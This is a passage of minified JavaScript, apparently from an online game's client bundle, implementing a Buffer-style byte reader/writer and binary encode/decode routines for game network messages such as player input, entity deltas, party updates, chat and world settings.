        configurable: !0,
        enumerable: !1,
        writable: !1
    }),
        xr.from = function (t, e, s) {
            return kr(t, e, s)
        }
        ,
        xr.prototype.__proto__ = Uint8Array.prototype,
        xr.__proto__ = Uint8Array,
        xr.allocUnsafe = function (t) {
            return $r(t)
        }
        ,
        xr.isBuffer = function (t) {
            return null != t && !0 === t._isBuffer && t !== xr.prototype
        }
        ,
        xr.isEncoding = function (t) {
            switch (String(t).toLowerCase()) {
                case "hex":
                case "utf8":
                case "utf-8":
                case "ascii":
                    return !0;
                default:
                    return !1
            }
        }
        ,
        xr.byteLength = Tr,
        xr.prototype._isBuffer = !0,
        xr.prototype.toString = function () {
            const t = this.length;
            return 0 === t ? "" : 0 === arguments.length ? Ar(this, 0, t) : Pr.apply(this, arguments)
        }
        ,
        xr.prototype.write = function (t, e, s, i) {
            if (void 0 === e)
                i = "utf8",
                    s = this.length,
                    e = 0;
            else if (void 0 === s && "string" == typeof e)
                i = e,
                    s = this.length,
                    e = 0;
            else {
                if (!isFinite(e))
                    throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");
                e >>>= 0,
                    isFinite(s) ? (s >>>= 0,
                        void 0 === i && (i = "utf8")) : (i = s,
                            s = void 0)
            }
            const n = this.length - e;
            if ((void 0 === s || s > n) && (s = n),
                t.length > 0 && (s < 0 || e < 0) || e > this.length)
                throw new RangeError("Attempt to write outside buffer bounds");
            i || (i = "utf8");
            let a = !1;
            for (; ;)
                switch (i) {
                    case "hex":
                        return hexWrite(this, t, e, s);
                    case "utf8":
                    case "utf-8":
                        return Ir(this, t, e, s);
                    case "ascii":
                        return Dr(this, t, e, s);
                    default:
                        if (a)
                            throw new TypeError("Unknown encoding: " + i);
                        i = ("" + i).toLowerCase(),
                            a = !0
                }
        }
        ,
        xr.prototype.toJSON = function () {
            return {
                type: "Buffer",
                data: Array.prototype.slice.call(this._arr || this, 0)
            }
        }
        ;
    const Br = 4096;
    function Rr(t) {
        const e = t.length;
        if (e <= Br)
            return String.fromCharCode.apply(String, t);
        let s = ""
            , i = 0;
        for (; i < e;)
            s += String.fromCharCode.apply(String, t.slice(i, i += Br));
        return s
    }
    function zr(t, e, s) {
        let i = "";
        s = Math.min(t.length, s);
        for (let n = e; n < s; ++n)
            i += String.fromCharCode(127 & t[n]);
        return i
    }
    function Fr(t, e, s) {
        const i = t.length;
        (!e || e < 0) && (e = 0),
            (!s || s < 0 || s > i) && (s = i);
        let n = "";
        for (let i = e; i < s; ++i)
            n += Lr(t[i]);
        return n
    }
    function Zr(t, e, s) {
        if (t % 1 != 0 || t < 0)
            throw new RangeError("offset is not uint");
        if (t + e > s)
            throw new RangeError("Trying to access beyond buffer length")
    }
    function Ur(t, e, s, i, n, a) {
        if (!xr.isBuffer(t))
            throw new TypeError('"buffer" argument must be a Buffer instance');
        if (e > n || e < a)
            throw new RangeError('"value" argument is out of bounds');
        if (s + i > t.length)
            throw new RangeError("Index out of range")
    }
    function Lr(t) {
        return t < 16 ? "0" + t.toString(16) : t.toString(16)
    }
    function Nr(t, e) {
        let s;
        e = e || 1 / 0;
        const i = t.length;
        let n = null;
        const a = [];
        for (let r = 0; r < i; ++r) {
            if (s = t.charCodeAt(r),
                s > 55295 && s < 57344) {
                if (!n) {
                    if (s > 56319) {
                        (e -= 3) > -1 && a.push(239, 191, 189);
                        continue
                    }
                    if (r + 1 === i) {
                        (e -= 3) > -1 && a.push(239, 191, 189);
                        continue
                    }
                    n = s;
                    continue
                }
                if (s < 56320) {
                    (e -= 3) > -1 && a.push(239, 191, 189),
                        n = s;
                    continue
                }
                s = 65536 + (n - 55296 << 10 | s - 56320)
            } else
                n && (e -= 3) > -1 && a.push(239, 191, 189);
            if (n = null,
                s < 128) {
                if ((e -= 1) < 0)
                    break;
                a.push(s)
            } else if (s < 2048) {
                if ((e -= 2) < 0)
                    break;
                a.push(s >> 6 | 192, 63 & s | 128)
            } else if (s < 65536) {
                if ((e -= 3) < 0)
                    break;
                a.push(s >> 12 | 224, s >> 6 & 63 | 128, 63 & s | 128)
            } else {
                if (!(s < 1114112))
                    throw new Error("Invalid code point");
                if ((e -= 4) < 0)
                    break;
                a.push(s >> 18 | 240, s >> 12 & 63 | 128, s >> 6 & 63 | 128, 63 & s | 128)
            }
        }
        return a
    }
    function Or(t) {
        const e = [];
        for (let s = 0; s < t.length; ++s)
            e.push(255 & t.charCodeAt(s));
        return e
    }
    function jr(t, e, s, i) {
        let n = 0;
        for (; n < i && !(n + s >= e.length || n >= t.length); ++n)
            e[n + s] = t[n];
        return n
    }
    function qr(t, e) {
        return t instanceof e || null != t && null != t.constructor && null != t.constructor.name && t.constructor.name === e.name
    }
    function Xr(t) {
        return t != t
    }
    xr.prototype.readUIntLE = function (t, e, s) {
        t >>>= 0,
            e >>>= 0,
            s || Zr(t, e, this.length);
        let i = this[t]
            , n = 1
            , a = 0;
        for (; ++a < e && (n *= 256);)
            i += this[t + a] * n;
        return i
    }
        ,
        xr.prototype.readUIntBE = function (t, e, s) {
            t >>>= 0,
                e >>>= 0,
                s || Zr(t, e, this.length);
            let i = this[t + --e]
                , n = 1;
            for (; e > 0 && (n *= 256);)
                i += this[t + --e] * n;
            return i
        }
        ,
        xr.prototype.readUInt8 = function (t, e) {
            return t >>>= 0,
                e || Zr(t, 1, this.length),
                this[t]
        }
        ,
        xr.prototype.readUInt16LE = function (t, e) {
            return t >>>= 0,
                e || Zr(t, 2, this.length),
                this[t] | this[t + 1] << 8
        }
        ,
        xr.prototype.readUInt16BE = function (t, e) {
            return t >>>= 0,
                e || Zr(t, 2, this.length),
                this[t] << 8 | this[t + 1]
        }
        ,
        xr.prototype.readUInt32LE = function (t, e) {
            return t >>>= 0,
                e || Zr(t, 4, this.length),
                (this[t] | this[t + 1] << 8 | this[t + 2] << 16) + 16777216 * this[t + 3]
        }
        ,
        xr.prototype.readUInt32BE = function (t, e) {
            return t >>>= 0,
                e || Zr(t, 4, this.length),
                16777216 * this[t] + (this[t + 1] << 16 | this[t + 2] << 8 | this[t + 3])
        }
        ,
        xr.prototype.readIntLE = function (t, e, s) {
            t >>>= 0,
                e >>>= 0,
                s || Zr(t, e, this.length);
            let i = this[t]
                , n = 1
                , a = 0;
            for (; ++a < e && (n *= 256);)
                i += this[t + a] * n;
            return n *= 128,
                i >= n && (i -= Math.pow(2, 8 * e)),
                i
        }
        ,
        xr.prototype.readIntBE = function (t, e, s) {
            t >>>= 0,
                e >>>= 0,
                s || Zr(t, e, this.length);
            let i = e
                , n = 1
                , a = this[t + --i];
            for (; i > 0 && (n *= 256);)
                a += this[t + --i] * n;
            return n *= 128,
                a >= n && (a -= Math.pow(2, 8 * e)),
                a
        }
        ,
        xr.prototype.readInt8 = function (t, e) {
            return t >>>= 0,
                e || Zr(t, 1, this.length),
                128 & this[t] ? -1 * (255 - this[t] + 1) : this[t]
        }
        ,
        xr.prototype.readInt16LE = function (t, e) {
            t >>>= 0,
                e || Zr(t, 2, this.length);
            const s = this[t] | this[t + 1] << 8;
            return 32768 & s ? 4294901760 | s : s
        }
        ,
        xr.prototype.readInt16BE = function (t, e) {
            t >>>= 0,
                e || Zr(t, 2, this.length);
            const s = this[t + 1] | this[t] << 8;
            return 32768 & s ? 4294901760 | s : s
        }
        ,
        xr.prototype.readInt32LE = function (t, e) {
            return t >>>= 0,
                e || Zr(t, 4, this.length),
                this[t] | this[t + 1] << 8 | this[t + 2] << 16 | this[t + 3] << 24
        }
        ,
        xr.prototype.readInt32BE = function (t, e) {
            return t >>>= 0,
                e || Zr(t, 4, this.length),
                this[t] << 24 | this[t + 1] << 16 | this[t + 2] << 8 | this[t + 3]
        }
        ,
        xr.prototype.writeUIntLE = function (t, e, s, i) {
            if (t = +t,
                e >>>= 0,
                s >>>= 0,
                !i) {
                Ur(this, t, e, s, Math.pow(2, 8 * s) - 1, 0)
            }
            let n = 1
                , a = 0;
            for (this[e] = 255 & t; ++a < s && (n *= 256);)
                this[e + a] = t / n & 255;
            return e + s
        }
        ,
        xr.prototype.writeUIntBE = function (t, e, s, i) {
            if (t = +t,
                e >>>= 0,
                s >>>= 0,
                !i) {
                Ur(this, t, e, s, Math.pow(2, 8 * s) - 1, 0)
            }
            let n = s - 1
                , a = 1;
            for (this[e + n] = 255 & t; --n >= 0 && (a *= 256);)
                this[e + n] = t / a & 255;
            return e + s
        }
        ,
        xr.prototype.writeUInt8 = function (t, e, s) {
            return t = +t,
                e >>>= 0,
                s || Ur(this, t, e, 1, 255, 0),
                this[e] = 255 & t,
                e + 1
        }
        ,
        xr.prototype.writeUInt16LE = function (t, e, s) {
            return t = +t,
                e >>>= 0,
                s || Ur(this, t, e, 2, 65535, 0),
                this[e] = 255 & t,
                this[e + 1] = t >>> 8,
                e + 2
        }
        ,
        xr.prototype.writeUInt16BE = function (t, e, s) {
            return t = +t,
                e >>>= 0,
                s || Ur(this, t, e, 2, 65535, 0),
                this[e] = t >>> 8,
                this[e + 1] = 255 & t,
                e + 2
        }
        ,
        xr.prototype.writeUInt32LE = function (t, e, s) {
            return t = +t,
                e >>>= 0,
                s || Ur(this, t, e, 4, 4294967295, 0),
                this[e + 3] = t >>> 24,
                this[e + 2] = t >>> 16,
                this[e + 1] = t >>> 8,
                this[e] = 255 & t,
                e + 4
        }
        ,
        xr.prototype.writeUInt32BE = function (t, e, s) {
            return t = +t,
                e >>>= 0,
                s || Ur(this, t, e, 4, 4294967295, 0),
                this[e] = t >>> 24,
                this[e + 1] = t >>> 16,
                this[e + 2] = t >>> 8,
                this[e + 3] = 255 & t,
                e + 4
        }
        ,
        xr.prototype.writeIntLE = function (t, e, s, i) {
            if (t = +t,
                e >>>= 0,
                !i) {
                const i = Math.pow(2, 8 * s - 1);
                Ur(this, t, e, s, i - 1, -i)
            }
            let n = 0
                , a = 1
                , r = 0;
            for (this[e] = 255 & t; ++n < s && (a *= 256);)
                t < 0 && 0 === r && 0 !== this[e + n - 1] && (r = 1),
                    this[e + n] = (t / a >> 0) - r & 255;
            return e + s
        }
        ,
        xr.prototype.writeIntBE = function (t, e, s, i) {
            if (t = +t,
                e >>>= 0,
                !i) {
                const i = Math.pow(2, 8 * s - 1);
                Ur(this, t, e, s, i - 1, -i)
            }
            let n = s - 1
                , a = 1
                , r = 0;
            for (this[e + n] = 255 & t; --n >= 0 && (a *= 256);)
                t < 0 && 0 === r && 0 !== this[e + n + 1] && (r = 1),
                    this[e + n] = (t / a >> 0) - r & 255;
            return e + s
        }
        ,
        xr.prototype.writeInt8 = function (t, e, s) {
            return t = +t,
                e >>>= 0,
                s || Ur(this, t, e, 1, 127, -128),
                t < 0 && (t = 255 + t + 1),
                this[e] = 255 & t,
                e + 1
        }
        ,
        xr.prototype.writeInt16LE = function (t, e, s) {
            return t = +t,
                e >>>= 0,
                s || Ur(this, t, e, 2, 32767, -32768),
                this[e] = 255 & t,
                this[e + 1] = t >>> 8,
                e + 2
        }
        ,
        xr.prototype.writeInt16BE = function (t, e, s) {
            return t = +t,
                e >>>= 0,
                s || Ur(this, t, e, 2, 32767, -32768),
                this[e] = t >>> 8,
                this[e + 1] = 255 & t,
                e + 2
        }
        ,
        xr.prototype.writeInt32LE = function (t, e, s) {
            return t = +t,
                e >>>= 0,
                s || Ur(this, t, e, 4, 2147483647, -2147483648),
                this[e] = 255 & t,
                this[e + 1] = t >>> 8,
                this[e + 2] = t >>> 16,
                this[e + 3] = t >>> 24,
                e + 4
        }
        ,
        xr.prototype.writeInt32BE = function (t, e, s) {
            return t = +t,
                e >>>= 0,
                s || Ur(this, t, e, 4, 2147483647, -2147483648),
                t < 0 && (t = 4294967295 + t + 1),
                this[e] = t >>> 24,
                this[e + 1] = t >>> 16,
                this[e + 2] = t >>> 8,
                this[e + 3] = 255 & t,
                e + 4
        }
        ,
        xr.prototype.copy = function (t, e, s, i) {
            if (!xr.isBuffer(t))
                throw new TypeError("argument should be a Buffer");
            if (s || (s = 0),
                i || 0 === i || (i = this.length),
                e >= t.length && (e = t.length),
                e || (e = 0),
                i > 0 && i < s && (i = s),
                i === s)
                return 0;
            if (0 === t.length || 0 === this.length)
                return 0;
            if (e < 0)
                throw new RangeError("targetStart out of bounds");
            if (s < 0 || s >= this.length)
                throw new RangeError("Index out of range");
            if (i < 0)
                throw new RangeError("sourceEnd out of bounds");
            i > this.length && (i = this.length),
                t.length - e < i - s && (i = t.length - e + s);
            const n = i - s;
            if (this === t && "function" == typeof Uint8Array.prototype.copyWithin)
                this.copyWithin(e, s, i);
            else if (this === t && s < e && e < i)
                for (let i = n - 1; i >= 0; --i)
                    t[i + e] = this[i + s];
            else
                Uint8Array.prototype.set.call(t, this.subarray(s, i), e);
            return n
        }
        ;
    var Hr = xr = xr;
    const Kr = 2147483647;
    let Wr = 0;
    const Yr = "utf8"
        , Vr = {
            string: function (t) {
                const e = Hr.byteLength(t, Yr);
                return io(e) + e
            },
            varuint: function (t) {
                return io(t)
            },
            varint: function (t) {
                return no(t)
            },
            buffer: function (t) {
                const e = t.length;
                return io(e) + e
            }
        };
    function Gr(t, e) {
        for (; t > 127;)
            e[Wr++] = 127 & t | 128,
                t >>= 7;
        e[Wr++] = 127 & t
    }
    function Qr(t) {
        let e, s = 0, i = 0;
        do {
            e = t[Wr++],
                s |= (127 & e) << 7 * i,
                i++
        } while (128 & e); return s
    }
    function Jr(t, e) {
        const s = Hr.byteLength(t || "", Yr);
        Gr(s, e),
            Wr += e.write(t || "", Wr, s, Yr)
    }
    function to(t) {
        const e = Qr(t)
            , s = t.toString(Yr, Wr, Wr + e);
        return Wr += e,
            s
    }
    function eo(t, e) {
        const s = t.length;
        Gr(s, e),
            t.copy(e, Wr),
            Wr += s
    }
    function so(t) {
        const e = Qr(t)
            , s = ao(e);
        return t.copy(s, 0, Wr, Wr + e),
            Wr += e,
            s
    }
    function io(t) {
        return t <= 0 ? 1 : Math.floor(Math.log(t) / Math.log(128)) + 1
    }
    function no(t) {
        return io(t << 1 ^ t >> 31)
    }
    const ao = function (t) {
        return Hr.allocUnsafe(t)
    }
        , ro = {
            clientPlayerInput: {
                decode: t => {
                    const e = {};
                    return Wr = 0,
                        e._header = t.readUInt8(Wr, !0),
                        Wr += 1,
                        e.jump = t.readUInt8(Wr, !0),
                        Wr += 1,
                        e.Za = t.readUInt32BE(Wr, !0),
                        Wr += 4,
                        e.rot = t.readUInt16BE(Wr, !0),
                        Wr += 2,
                        e.steer = t.readUInt8(Wr, !0),
                        Wr += 1,
                        e.tickId = t.readUInt32BE(Wr, !0),
                        Wr += 4,
                        e
                }
                ,
                encode: t => {
                    const e = t;
                    let s = 0;
                    s += 1,
                        s += 1,
                        s += 4,
                        s += 2,
                        s += 1,
                        s += 4;
                    const i = ao(s);
                    return Wr = 0,
                        Wr = i.writeUInt8(e._header, Wr, !0),
                        Wr = i.writeUInt8(e.jump, Wr, !0),
                        Wr = i.writeUInt32BE(e.Za, Wr, !0),
                        Wr = i.writeUInt16BE(e.rot, Wr, !0),
                        Wr = i.writeUInt8(e.steer, Wr, !0),
                        Wr = i.writeUInt32BE(e.tickId, Wr, !0),
                        i
                }
            },
            clientPlayerChangeTarget: {
                decode: t => {
                    const e = {};
                    return Wr = 0,
                        e._header = t.readUInt8(Wr, !0),
                        Wr += 1,
                        e.target = t.readUInt16BE(Wr, !0),
                        Wr += 2,
                        e
                }
                ,
                encode: t => {
                    const e = t;
                    let s = 0;
                    s += 1,
                        s += 2;
                    const i = ao(s);
                    return Wr = 0,
                        Wr = i.writeUInt8(e._header, Wr, !0),
                        Wr = i.writeUInt16BE(e.target, Wr, !0),
                        i
                }
            },
            clientPlayerSkill: {
                decode: t => {
                    const e = {};
                    Wr = 0,
                        e._header = t.readUInt8(Wr, !0),
                        Wr += 1,
                        e.id = t.readUInt16BE(Wr, !0),
                        Wr += 2;
                    const s = [];
                    e.info = s;
                    const i = Qr(t);
                    for (let e = 0; e < i; e++)
                        s[e] = t.readUInt32BE(Wr, !0),
                            Wr += 4;
                    return e
                }
                ,
                encode: t => {
                    const e = t
                        , s = e.info;
                    let i = 0;
                    i += 1,
                        i += 2,
                        i += io(s.length);
                    for (let t = 0; t < s.length; t++)
                        i += 4;
                    const n = ao(i);
                    Wr = 0,
                        Wr = n.writeUInt8(e._header, Wr, !0),
                        Wr = n.writeUInt16BE(e.id, Wr, !0),
                        Gr(s.length, n);
                    for (let t = 0; t < s.length; t++)
                        Wr = n.writeUInt32BE(s[t], Wr, !0);
                    return n
                }
            },
            clientPlayerInteract: {
                decode: t => {
                    const e = {};
                    return Wr = 0,
                        e._header = t.readUInt8(Wr, !0),
                        Wr += 1,
                        e.id = t.readUInt8(Wr, !0),
                        Wr += 1,
                        e
                }
                ,
                encode: t => {
                    const e = t;
                    let s = 0;
                    s += 1,
                        s += 1;
                    const i = ao(s);
                    return Wr = 0,
                        Wr = i.writeUInt8(e._header, Wr, !0),
                        Wr = i.writeUInt8(e.id, Wr, !0),
                        i
                }
            },
            clientCommand: {
                decode: t => {
                    const e = {};
                    return Wr = 0,
                        e._header = t.readUInt8(Wr, !0),
                        Wr += 1,
                        e.command = to(t),
                        e.string = to(t),
                        e
                }
                ,
                encode: t => {
                    const e = t;
                    let s = 0;
                    s += 1,
                        s += Vr.string(e.command),
                        s += Vr.string(e.string);
                    const i = ao(s);
                    return Wr = 0,
                        Wr = i.writeUInt8(e._header, Wr, !0),
                        Jr(e.command, i),
                        Jr(e.string, i),
                        i
                }
            },
            serverOnClientConnect: {
                decode: t => {
                    const e = {};
                    return Wr = 0,
                        e._header = t.readUInt8(Wr, !0),
                        Wr += 1,
                        e.file = to(t),
                        e.playerId = t.readUInt16BE(Wr, !0),
                        Wr += 2,
                        e.world = to(t),
                        e
                }
                ,
                encode: t => {
                    const e = t;
                    let s = 0;
                    s += 1,
                        s += Vr.string(e.file),
                        s += 2,
                        s += Vr.string(e.world);
                    const i = ao(s);
                    return Wr = 0,
                        Wr = i.writeUInt8(e._header, Wr, !0),
                        Jr(e.file, i),
                        Wr = i.writeUInt16BE(e.playerId, Wr, !0),
                        Jr(e.world, i),
                        i
                }
            },
            serverEntityDelta: {
                decode: t => {
                    const e = {};
                    Wr = 0,
                        e._header = t.readUInt8(Wr, !0),
                        Wr += 1;
                    const s = [];
                    e.data = s;
                    const i = [];
                    s[0] = i;
                    const n = Qr(t);
                    for (let e = 0; e < n; e++) {
                        const s = [];
                        i[e] = s;
                        const n = Qr(t);
                        for (let e = 0; e < n; e++)
                            s[e] = t.readUInt8(Wr, !0),
                                Wr += 1
                    }
                    const a = [];
                    s[1] = a;
                    const r = Qr(t);
                    for (let e = 0; e < r; e++) {
                        const s = [];
                        a[e] = s;
                        const i = Qr(t);
                        for (let e = 0; e < i; e++)
                            s[e] = t.readUInt16BE(Wr, !0),
                                Wr += 2
                    }
                    const o = Qr(t);
                    for (let e = 2; e < o; e++) {
                        const i = [];
                        s[e] = i;
                        const n = Qr(t);
                        for (let e = 0; e < n; e++) {
                            const s = [];
                            i[e] = s;
                            const n = Qr(t);
                            for (let e = 0; e < n; e++)
                                s[e] = t.readUInt32BE(Wr, !0),
                                    Wr += 4
                        }
                    }
                    const l = [];
                    e.ids = l;
                    const c = Qr(t);
                    for (let e = 0; e < c; e++) {
                        const s = [];
                        l[e] = s;
                        const i = Qr(t);
                        for (let e = 0; e < i; e++)
                            s[e] = t.readUInt16BE(Wr, !0),
                                Wr += 2
                    }
                    const h = [];
                    e.log = h;
                    const d = Qr(t);
                    for (let e = 0; e < d; e++) {
                        const s = {};
                        h[e] = s;
                        const i = [];
                        s.data = i,
                            s.type = t.readUInt8(Wr, !0),
                            Wr += 1;
                        const n = Qr(t);
                        for (let e = 0; e < n; e++)
                            i[e] = Qr(t)
                    }
                    return e.tickId = t.readUInt32BE(Wr, !0),
                        Wr += 4,
                        e
                }
                ,
                encode: t => {
                    const e = t
                        , s = e.data
                        , i = s[0]
                        , n = s[1]
                        , a = e.ids
                        , r = e.log;
                    let o = 0;
                    o += 1,
                        o += io(i.length);
                    for (let t = 0; t < i.length; t++) {
                        const e = i[t];
                        o += io(e.length);
                        for (let t = 0; t < e.length; t++)
                            o += 1
                    }
                    o += io(n.length);
                    for (let t = 0; t < n.length; t++) {
                        const e = n[t];
                        o += io(e.length);
                        for (let t = 0; t < e.length; t++)
                            o += 2
                    }
                    o += io(s.length);
                    for (let t = 2; t < s.length; t++) {
                        const e = s[t];
                        o += io(e.length);
                        for (let t = 0; t < e.length; t++) {
                            const s = e[t];
                            o += io(s.length);
                            for (let t = 0; t < s.length; t++)
                                o += 4
                        }
                    }
                    o += io(a.length);
                    for (let t = 0; t < a.length; t++) {
                        const e = a[t];
                        o += io(e.length);
                        for (let t = 0; t < e.length; t++)
                            o += 2
                    }
                    o += io(r.length);
                    for (let t = 0; t < r.length; t++) {
                        const e = r[t].data;
                        o += 1,
                            o += io(e.length);
                        for (let t = 0; t < e.length; t++)
                            o += Vr.varuint(e[t])
                    }
                    o += 4;
                    const l = ao(o);
                    Wr = 0,
                        Wr = l.writeUInt8(e._header, Wr, !0),
                        Gr(i.length, l);
                    for (let t = 0; t < i.length; t++) {
                        const e = i[t];
                        Gr(e.length, l);
                        for (let t = 0; t < e.length; t++)
                            Wr = l.writeUInt8(e[t], Wr, !0)
                    }
                    Gr(n.length, l);
                    for (let t = 0; t < n.length; t++) {
                        const e = n[t];
                        Gr(e.length, l);
                        for (let t = 0; t < e.length; t++)
                            Wr = l.writeUInt16BE(e[t], Wr, !0)
                    }
                    Gr(s.length, l);
                    for (let t = 2; t < s.length; t++) {
                        const e = s[t];
                        Gr(e.length, l);
                        for (let t = 0; t < e.length; t++) {
                            const s = e[t];
                            Gr(s.length, l);
                            for (let t = 0; t < s.length; t++)
                                Wr = l.writeUInt32BE(s[t], Wr, !0)
                        }
                    }
                    Gr(a.length, l);
                    for (let t = 0; t < a.length; t++) {
                        const e = a[t];
                        Gr(e.length, l);
                        for (let t = 0; t < e.length; t++)
                            Wr = l.writeUInt16BE(e[t], Wr, !0)
                    }
                    Gr(r.length, l);
                    for (let t = 0; t < r.length; t++) {
                        const e = r[t]
                            , s = e.data;
                        Wr = l.writeUInt8(e.type, Wr, !0),
                            Gr(s.length, l);
                        for (let t = 0; t < s.length; t++)
                            Gr(s[t], l)
                    }
                    return Wr = l.writeUInt32BE(e.tickId, Wr, !0),
                        l
                }
            },
            serverPartyUpdate: {
                decode: t => {
                    const e = {};
                    Wr = 0,
                        e._header = t.readUInt8(Wr, !0),
                        Wr += 1;
                    const s = [];
                    e.members = s;
                    const i = Qr(t);
                    for (let e = 0; e < i; e++) {
                        const i = {};
                        s[e] = i,
                            i.class = t.readUInt8(Wr, !0),
                            Wr += 1,
                            i.entityid = t.readUInt16BE(Wr, !0),
                            Wr += 2,
                            i.level = t.readUInt8(Wr, !0),
                            Wr += 1,
                            i.name = to(t),
                            i.role = t.readUInt16BE(Wr, !0),
                            Wr += 2,
                            i.world = to(t)
                    }
                    const n = [];
                    e.queues = n;
                    const a = Qr(t);
                    for (let e = 0; e < a; e++)
                        n[e] = to(t);
                    return e
                }
                ,
                encode: t => {
                    const e = t
                        , s = e.members
                        , i = e.queues;
                    let n = 0;
                    n += 1,
                        n += io(s.length);
                    for (let t = 0; t < s.length; t++) {
                        const e = s[t];
                        n += 1,
                            n += 2,
                            n += 1,
                            n += Vr.string(e.name),
                            n += 2,
                            n += Vr.string(e.world)
                    }
                    n += io(i.length);
                    for (let t = 0; t < i.length; t++)
                        n += Vr.string(i[t]);
                    const a = ao(n);
                    Wr = 0,
                        Wr = a.writeUInt8(e._header, Wr, !0),
                        Gr(s.length, a);
                    for (let t = 0; t < s.length; t++) {
                        const e = s[t];
                        Wr = a.writeUInt8(e.class, Wr, !0),
                            Wr = a.writeUInt16BE(e.entityid, Wr, !0),
                            Wr = a.writeUInt8(e.level, Wr, !0),
                            Jr(e.name, a),
                            Wr = a.writeUInt16BE(e.role, Wr, !0),
                            Jr(e.world, a)
                    }
                    Gr(i.length, a);
                    for (let t = 0; t < i.length; t++)
                        Jr(i[t], a);
                    return a
                }
            },
            serverPartyPositions: {
                decode: t => {
                    const e = {};
                    Wr = 0,
                        e._header = t.readUInt8(Wr, !0),
                        Wr += 1;
                    const s = [];
                    e.members = s;
                    const i = Qr(t);
                    for (let e = 0; e < i; e++) {
                        const i = {};
                        s[e] = i,
                            i.entityid = t.readUInt16BE(Wr, !0),
                            Wr += 2,
                            i.Za = t.readUInt32BE(Wr, !0),
                            Wr += 4
                    }
                    return e
                }
                ,
                encode: t => {
                    const e = t
                        , s = e.members;
                    let i = 0;
                    i += 1,
                        i += io(s.length);
                    for (let t = 0; t < s.length; t++) {
                        s[t];
                        i += 2,
                            i += 4
                    }
                    const n = ao(i);
                    Wr = 0,
                        Wr = n.writeUInt8(e._header, Wr, !0),
                        Gr(s.length, n);
                    for (let t = 0; t < s.length; t++) {
                        const e = s[t];
                        Wr = n.writeUInt16BE(e.entityid, Wr, !0),
                            Wr = n.writeUInt32BE(e.Za, Wr, !0)
                    }
                    return n
                }
            },
            serverPersonalLog: {
                decode: t => {
                    const e = {};
                    Wr = 0,
                        e._header = t.readUInt8(Wr, !0),
                        Wr += 1;
                    const s = [];
                    e.log = s;
                    const i = Qr(t);
                    for (let e = 0; e < i; e++) {
                        const i = {};
                        s[e] = i;
                        const n = [];
                        i.data = n,
                            i.type = t.readUInt8(Wr, !0),
                            Wr += 1;
                        const a = Qr(t);
                        for (let e = 0; e < a; e++)
                            n[e] = Qr(t)
                    }
                    return e
                }
                ,
                encode: t => {
                    const e = t
                        , s = e.log;
                    let i = 0;
                    i += 1,
                        i += io(s.length);
                    for (let t = 0; t < s.length; t++) {
                        const e = s[t].data;
                        i += 1,
                            i += io(e.length);
                        for (let t = 0; t < e.length; t++)
                            i += Vr.varuint(e[t])
                    }
                    const n = ao(i);
                    Wr = 0,
                        Wr = n.writeUInt8(e._header, Wr, !0),
                        Gr(s.length, n);
                    for (let t = 0; t < s.length; t++) {
                        const e = s[t]
                            , i = e.data;
                        Wr = n.writeUInt8(e.type, Wr, !0),
                            Gr(i.length, n);
                        for (let t = 0; t < i.length; t++)
                            Gr(i[t], n)
                    }
                    return n
                }
            },
            serverChat: {
                decode: t => {
                    const e = {};
                    Wr = 0,
                        e._header = t.readUInt8(Wr, !0),
                        Wr += 1;
                    const s = [];
                    e.messages = s;
                    const i = Qr(t);
                    for (let e = 0; e < i; e++) {
                        const i = {};
                        s[e] = i,
                            i.channel = to(t),
                            i.clan = to(t),
                            i.class = t.readUInt8(Wr, !0),
                            Wr += 1,
                            i.faction = t.readUInt8(Wr, !0),
                            Wr += 1,
                            i.from = to(t),
                            i.level = t.readUInt8(Wr, !0),
                            Wr += 1,
                            i.message = to(t),
                            i.subscribed = t.readUInt8(Wr, !0),
                            Wr += 1,
                            i.to = to(t)
                    }
                    return e
                }
                ,
                encode: t => {
                    const e = t
                        , s = e.messages;
                    let i = 0;
                    i += 1,
                        i += io(s.length);
                    for (let t = 0; t < s.length; t++) {
                        const e = s[t];
                        i += Vr.string(e.channel),
                            i += Vr.string(e.clan),
                            i += 1,
                            i += 1,
                            i += Vr.string(e.from),
                            i += 1,
                            i += Vr.string(e.message),
                            i += 1,
                            i += Vr.string(e.to)
                    }
                    const n = ao(i);
                    Wr = 0,
                        Wr = n.writeUInt8(e._header, Wr, !0),
                        Gr(s.length, n);
                    for (let t = 0; t < s.length; t++) {
                        const e = s[t];
                        Jr(e.channel, n),
                            Jr(e.clan, n),
                            Wr = n.writeUInt8(e.class, Wr, !0),
                            Wr = n.writeUInt8(e.faction, Wr, !0),
                            Jr(e.from, n),
                            Wr = n.writeUInt8(e.level, Wr, !0),
                            Jr(e.message, n),
                            Wr = n.writeUInt8(e.subscribed, Wr, !0),
                            Jr(e.to, n)
                    }
                    return n
                }
            },
            serverSystemMessage: {
                decode: t => {
                    const e = {};
                    Wr = 0,
                        e._header = t.readUInt8(Wr, !0),
                        Wr += 1;
                    const s = [];
                    e.messages = s;
                    const i = Qr(t);
                    for (let e = 0; e < i; e++) {
                        const i = {};
                        s[e] = i,
                            i.message = to(t),
                            i.type = to(t)
                    }
                    return e
                }
                ,
                encode: t => {
                    const e = t
                        , s = e.messages;
                    let i = 0;
                    i += 1,
                        i += io(s.length);
                    for (let t = 0; t < s.length; t++) {
                        const e = s[t];
                        i += Vr.string(e.message),
                            i += Vr.string(e.type)
                    }
                    const n = ao(i);
                    Wr = 0,
                        Wr = n.writeUInt8(e._header, Wr, !0),
                        Gr(s.length, n);
                    for (let t = 0; t < s.length; t++) {
                        const e = s[t];
                        Jr(e.message, n),
                            Jr(e.type, n)
                    }
                    return n
                }
            }
        }
        , oo = {
            world: {
                decode: t => {
                    const e = {};
                    Wr = 0,
                        e.chunkAmount = t.readUInt8(Wr, !0),
                        Wr += 1;
                    const s = [];
                    e.cols = s;
                    const i = Qr(t);
                    for (let e = 0; e < i; e++) {
                        const i = {};
                        s[e] = i,
                            i.ambient = t.readUInt32BE(Wr, !0),
                            Wr += 4,
                            i.directional = t.readUInt32BE(Wr, !0),
                            Wr += 4,
                            i.fog = t.readUInt32BE(Wr, !0),
                            Wr += 4,
                            i.sky = t.readUInt32BE(Wr, !0),
                            Wr += 4
                    }
                    const n = [];
                    e.settings = n;
                    const a = Qr(t);
                    for (let e = 0; e < a; e++) {
                        const s = {};
                        n[e] = s,
                            s.id = to(t),
                            s.value = to(t)
                    }
                    const r = [];
                    e.spawns = r;
                    const o = Qr(t);
                    for (let e = 0; e < o; e++) {
                        const s = {};
                        r[e] = s,
                            s.class = t.readUInt16BE(Wr, !0),
                            Wr += 2,
                            s.faction = t.readUInt8(Wr, !0),
                            Wr += 1,
